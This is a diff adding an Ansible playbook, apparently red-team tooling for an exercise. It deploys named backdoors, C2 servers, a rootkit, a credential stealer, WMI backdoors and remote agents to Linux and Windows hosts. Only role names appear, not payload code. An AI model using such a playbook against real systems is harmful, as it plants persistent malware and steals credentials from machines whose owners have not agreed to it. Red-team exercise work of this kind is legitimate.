@@ -1,0 +1,110 @@
+# linux
+- name: Low Hanging Fruits
+  hosts: linux:!pfsense
+  become: yes
+  roles:
+    - sshkeys
+    - trainingwheels
+    # - pam
+  tags:
+    - low
+    - linux
+
+- name: Backdoors
+  become: yes
+  hosts: linux:!pfsense
+  roles:
+    - father
+    - watershell
+    - nomnom
+    # - retriever
+    - linux_vishnu
+  tags:
+    - backdoors
+    - linux
+
+- name: C2 Servers
+  hosts: all:!pfsense
+  become: yes
+  roles:
+    - linux_br4vo6ix
+    # - discordgo
+    # - meepsuite
+  tags:
+    - c2
+    - linux
+
+- name: install parasite rootkit
+  hosts: linux:!pfsense
+  become: yes
+  roles:
+    - parasite
+  tags:
+    - parasite
+
+# pfsense
+
+# windows
+- name: Windows Standards -> Windows Red Team Deploy
+  hosts: windows
+  roles:
+    - windows_deploy_low_fruit
+    - windows_deploy_cmds
+  tags:
+    - stds
+    - d3adzo
+
+- name: Backdoor -> nosferatu
+  hosts: windows
+  roles:
+    - malware_deploy_nosferatu
+  tags:
+    - nosferatu
+    - malware
+    - d3adzo
+
+- name: Cred Stealing -> WinFilter
+  hosts: windows
+  roles:
+    - malware_deploy_winfilter
+  tags:
+    - winfilter
+    - malware
+    - d3adzo
+
+- name: Backdoor -> WMI
+  hosts: windows
+  roles:
+    - malware_wmi_backdoor
+  tags:
+    - wmi_backdoor
+    - malware
+    - d3adzo
+
+- name: Agent -> Jake
+  hosts: windows
+  roles:
+    - malware_jake
+  tags:
+    - jake
+    - malware
+    - agent
+
+- name: Agent -> DiscordGo
+  hosts: windows
+  roles:
+    - windows_discordgo
+  tags:
+    - emmanuel
+    - malware
+    - agent
+
+- name: Deploy rmm (Windows)
+  hosts: windows
+  roles:
+    - linux_rmm
+  tags:
+    - evan
+    - malware
+    - rmm
+
